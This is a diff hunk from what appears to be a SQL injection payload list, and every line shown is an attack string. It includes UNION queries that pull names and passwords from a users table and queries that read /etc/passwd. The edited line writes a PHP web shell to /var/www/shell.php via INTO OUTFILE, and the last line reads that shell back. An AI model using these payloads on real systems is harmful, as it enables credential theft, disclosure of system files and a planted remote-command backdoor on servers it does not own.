@@ -8,7 +8,6 @@
 1' union select null,concat(first_name,0x0a,password) from users #
 1' union all select load_file('/etc/passwd'),null #
 1' union select load_file('/etc/passwd'),null #
-
-1' union select "<?php system($_GET['cmd']) ?>”" ,8 into outfile '/var/www/shell.php'#
+1' union select "<?php system($_GET['cmd']) ?>" ,8 into outfile '/var/www/shell.php'#
 1' union select null, load_file('/var/www/shell.php')#
 
